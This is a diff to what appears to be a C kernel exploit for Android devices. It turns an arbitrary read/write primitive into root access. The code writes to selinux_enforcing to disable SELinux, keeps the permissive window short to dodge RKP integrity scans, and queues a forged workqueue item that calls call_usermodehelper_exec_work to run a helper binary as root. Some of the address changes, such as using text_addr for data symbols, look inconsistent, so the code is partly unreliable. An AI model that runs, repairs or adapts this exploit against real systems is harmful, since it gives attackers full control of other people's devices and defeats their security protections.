@@ -91,10 +91,8 @@ static int wake_system_unbound(void) {
   return master_close == 0 && slave_close == 0;
 }
 
-/* The CFI stage establishes the configfs primitive, then the UMH stage uses
- * the pipe-backed physical R/W path for direct-map objects.  This is the
- * path used for slab-resident workqueue objects; configfs alone can
- * read the .data pointer but reboots when it dereferences the returned pwq. */
+/* The CFI stage leaves the redirected fd as a configfs arbitrary-R/W handle.
+ * Keep using that verified handle for the workqueue walk. */
 static uint64_t umh_read64(int fd, uintptr_t addr) {
   return kernel_read64(fd, addr);
 }
@@ -114,9 +112,9 @@ static int umh_write(int fd, uintptr_t addr, const void *data, size_t len) {
  * the syscall result as well: a missing "end" marker means the target access
  * itself killed/restarted the kernel. */
 static int umh_target_ok(uintptr_t addr, size_t len, const char *tag) {
-  if (len == 0 || !is_direct_ptr(addr) ||
+  if (len == 0 || !is_kernel_ptr(addr) ||
       len - 1 > UINTPTR_MAX - addr ||
-      !is_direct_ptr(addr + len - 1)) {
+      !is_kernel_ptr(addr + len - 1)) {
     pr_error("root umh invalid target tag=%s addr=%016zx len=%zu\n",
              tag, addr, len);
     return 0;
@@ -226,22 +224,23 @@ int install_workqueue_umh_root(int fd, const char *helper_path,
 
   /* Permissive first, then immediately queue the work — keep
    * the permissive window as short as possible (RKP scans). */
-  uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
-  uintptr_t wq_slot = data_addr(SYSTEM_UNBOUND_WQ);
+  uintptr_t selinux_addr = text_addr(SELINUX_ENFORCING);
+  uintptr_t wq_slot = text_addr(SYSTEM_UNBOUND_WQ);
   pr_info("root umh start page=%016zx selinux=%016zx wq_slot=%016zx "
           "work=%016zx data=%016zx\n",
           page_base, selinux_addr, wq_slot, fake_work_addr, umh_data_addr);
-  if (!is_direct_ptr(selinux_addr) || !is_direct_ptr(wq_slot) ||
-      !is_direct_ptr(fake_work_addr) || !is_direct_ptr(umh_data_addr)) {
+  if (!is_kernel_ptr(selinux_addr) || !is_kernel_ptr(wq_slot) ||
+      !is_kernel_ptr(fake_work_addr) || !is_kernel_ptr(umh_data_addr)) {
     pr_error("root umh invalid staging address selinux=%016zx "
              "wq_slot=%016zx work=%016zx data=%016zx\n",
              selinux_addr, wq_slot, fake_work_addr, umh_data_addr);
     return 0;
   }
   uint8_t permissive = 0;
-  int selinux_write = umh_write_checked(
-      fd, selinux_addr, &permissive, sizeof(permissive),
-      "selinux.enforcing");
+  errno = 0;
+  int selinux_write =
+      kernel_write_data(fd, selinux_addr, &permissive,
+                        sizeof(permissive)) == (ssize_t)sizeof(permissive);
   pr_info("root umh selinux write addr=%016zx ok=%d\n",
           selinux_addr, selinux_write);
   if (!selinux_write) {
@@ -289,13 +288,19 @@ int install_workqueue_umh_root(int fd, const char *helper_path,
   uint64_t umh_work_func = text_addr(CALL_USERMODEHELPER_EXEC_WORK);
 
   uint64_t wq_value = 0;
-  if (!umh_read64_checked(fd, wq_slot, "system_unbound_wq", &wq_value, 1)) {
+  if (kernel_read_data(fd, wq_slot, &wq_value, sizeof(wq_value)) !=
+      (ssize_t)sizeof(wq_value)) {
+    pr_error("root umh system_unbound_wq configfs read failed\n");
     return 0;
   }
   uintptr_t wq = (uintptr_t)wq_value;
   pr_info("root umh read wq slot=%016zx value=%016zx\n", wq_slot, wq);
   if (!is_direct_ptr(wq)) {
     pr_error("root umh invalid workqueue pointer wq=%016zx\n", wq);
+    return 0;
+  }
+  if (!install_pipe_physrw(fd)) {
+    pr_error("root umh pipe physical R/W setup failed\n");
     return 0;
   }
 
